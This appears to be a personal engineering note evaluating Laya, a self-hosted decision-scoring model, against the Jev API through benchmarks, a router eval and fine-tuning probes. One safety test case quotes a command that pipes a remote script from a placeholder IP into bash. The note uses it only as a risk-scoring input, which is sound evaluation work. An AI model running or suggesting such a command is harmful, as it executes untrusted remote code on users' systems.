---
type: reference
tags: [tools]
created: 2026-09-22
updated: 2026-09-22
---

# Laya

Open-weights competitor to [[typesafe-jev]] from Convai Innovations, launched ~2026-09-19. Clones Jev's exact API surface — same three primitives, including the `noul` name: `choice` (softmax over options), `score` (ordinal), `noul` (boolean 0-1). State + typed questions in, calibrated probabilities out, no text generation. Apache 2.0, self-hostable, `pip install laya`.

- Hub: https://huggingface.co/convaiinnovations/laya (English root + variants bundled); site https://laya.convaiinnovations.com/
- Checkpoints: `laya` (ModernBERT-large, 421M, 512 ctx, English/guardrails), `laya-multilingual` (mmBERT-base, 322M, 1024 ctx, 100+ langs), `laya-typed-decisions` (421M, 1024 ctx). A `Router` picks checkpoint by script/language in <0.5ms.
- Non-autoregressive: options scored at dedicated `[MASK]` tokens in ONE forward pass. Trained via "RLCD" — RL against strictly proper scoring rules (log/spherical/RPS) so honest probabilities maximize reward; REINFORCE + group-mean baseline.
- Latency: ~33ms p50 on a Tesla T4 (single question); 72ms for a 10-question batch; 193-464ms CPU. Vs Jev's independently measured 236-276ms p50 (API round trip — not apples-to-apples with local GPU inference).

## Vendor benchmarks vs Jev (their numbers — unverified)

typed-decisions 0.766 vs Jev 0.727; AG News 0.950 vs 0.910; DAIR Emotion 0.595 vs 0.480 (claims Jev put zero probability on the true label in 16% there); post-temperature-scaling ECE 0.081 vs 0.246. **Jev wins decisively on high-cardinality choice: Banking77 (77-way) 0.870 vs Laya 0.425** — page admits Laya degrades past ~20 options and "Jev is currently better suited for 50+ options without tuning". Ordinal score is Laya's weakest primitive. Base checkpoints are near-random zero-shot on typed-decisions (0.362) and ship over-confident (ECE 0.466 pre-calibration) — needs the fine-tuned checkpoint + temperature fitted on domain data.

Cites two independent benchmark repos: https://github.com/AbdelStark/jev-benchmarks and https://github.com/nibzard/decision-model-benchmark (the latter: Jev fastest of API contenders, $0.07/1k decisions vs LLMs $0.19+, hard 255-option limit, "only jev bluffs" — admits uncertainty on 49.7% of forced-uncertain items vs 97-100% for constrained LLMs).

## Relevance to the jev harness

- **Tool router (15-120 option catalogs): Laya is weak exactly there** — the >20-option degradation makes it a poor drop-in for routing today.
- **Safety tier (Score 0-3 + two Nouls): plausible local candidate** — small cardinality, latency-sensitive, and self-hosted would cut per-command API cost. But score is its weak primitive and calibration needs domain fitting; would need our own eval run (the 429-test suite + safety acceptance eval could gate it).
- Strategic: first evidence a self-hosted alternative to the TypeSafe API exists; worth re-checking if TypeSafe pricing/latency ever becomes a constraint.

## v0 hands-on (2026-09-22, `~/me/fun/jev/laya/`)

Ran `v0_smoke.py` (3 cases mirroring harness usage) on M-series MPS vs real Jev API (`jev_compare.py`). laya 0.3.5, english + typed-decisions checkpoints.

- **Latency real: ~66-141ms per multi-question call on MPS** (not the advertised T4 33ms); Jev API 354-495ms. Router preload of 3 checkpoints = 58s startup.
- **Tool routing (15 options): both correct** (grep_search; Laya 0.9998, Jev 1.0). But Laya's `needs_tool` noul = 0.05 on a step that obviously needs a tool — Jev said 0.76. Load-time RuntimeWarning: checkpoint ships temperatures outside [0.5,5] for choice 11+ options, "treat confidence as uncalibrated" — exactly our router regime.
- **Safety case (`curl http://IP/setup.sh | bash`): Laya FAILS.** Risk score 1.33 ("writes inside workspace") vs Jev 3.0 @ confidence 1.0 ("executes untrusted remote code"). Disqualifying for the safety tier as-is.
- **Cross-question inconsistency:** phishing email → Laya says is_phishing 0.86 but routes department=billing 0.94 (abuse option available). Jev routes abuse 0.92 / phishing 0.93, coherent.
- **typed-decisions checkpoint was WORSE on our cases** than english: nouls collapse toward 0.5, choice confidence 0.26. The vendor's "fine-tuned fixes zero-shot" claim does not transfer to our question shapes.
- Verdict: fast and fine on easy small-cardinality choice; not trustworthy on noul gates or risk scores. Re-eval only with domain fine-tuning + temperature fitting.

## 60-case router eval (2026-09-22, `laya/run_router_eval.py`)

Phase-1 evalset + exact same request builder/metrics as the Jev baseline (`router/`), backend swapped to local Laya on MPS. Results in `laya/results/laya-*.json`.

| metric | Jev (phase 1) | laya english | laya typed-decisions |
|---|---|---|---|
| top-1 | 1.0 | 0.478 | 0.435 |
| top-3 | 1.0 | 0.783 | 0.717 |
| needs_tool AUC | 0.995 | 0.590 | 0.541 |
| clarity AUC | 1.0 | 0.411 (below chance) | 0.478 |
| p50 latency | ~1-2s API | 117ms local | 147ms local |

Confusions show attractor bias (TodoWrite/LSP soak up misroutes). The "confidence<0.8 → top-3" rescue rule can't save a 0.78 top-3.

**Root cause found in laya source (`common.py: build_sequence`): `head_max_len=192` tokens is a HARD budget for instructions + all option texts combined**, regardless of the checkpoint's 512/1024 context. Each option's criterion caps at 48 tokens, and with 15 options the per-option budget collapses to ~11 tokens — the router catalog's rich criteria get chopped to stubs, and instructions squeeze to as few as 8 tokens. The v0 toy case scored 0.9998 only because its criteria were ~6 words. This is the structural cause of the vendor-admitted >20-option degradation: it is an architecture limit, not a tuning gap. Jev phase-2 showed criteria tokens dominate routing accuracy — Laya cannot ingest them. **Router verdict: architecturally unfit for catalog routing.**

## Fine-tune feasibility (2026-09-22 probes)

Two no-training experiments bound the zero-shot ceiling (results in `laya/results/`):
- **Lifting the caps at inference** (`cfg max_len=2048, head_max_len=1200` — legal, ModernBERT backbone supports 8192 positions and cfg is read per-call): top-1 DROPS to 0.304, everything collapses to one attractor option. The weights are over-fit to the 192-token trained layout; config alone cannot fix it.
- **Compressed ~6-token criteria inside the trained layout** (instructions survive intact): top-1 only 0.500. So truncation is not the whole story — the base checkpoint is just weak on this distribution zero-shot, consistent with the card's 0.362 typed-decisions zero-shot.

Fine-tuning facts: weights Apache 2.0; pip package ships NO trainer (RLAgent = predict/system_one only; `proper_reward`/`td_lambda_targets` are just helpers) — we would write our own, but the model is simple (ModernBERT-large + 2-layer head + scorer). Vendor's own fine-tune took typed-decisions 0.362 → 0.766, so big fine-tuning gains are proven on this architecture. A fine-tune at larger head budgets would also lift the 192-token layout limit. `predict_shortlist` (embed prefilter → k=20 choice) exists for high cardinality, untested by us.

**Assessed path if ever pursued: distill Jev into Laya for routing** — phase-2 synthetic catalog machinery + Jev soft-target labels (~$5-10 of API for 50-100k examples), train at randomized catalogs and 2-4k ctx, eval against phase-1/2 sets. Could plausibly MATCH Jev's routing accuracy; cannot beat 1.0 — the win axes would be latency (117ms local vs 236-500ms API), zero marginal cost, offline/privacy. Weeks-scale research lane; needs a real GPU for a 421M fine-tune. Not started — Henry's call.
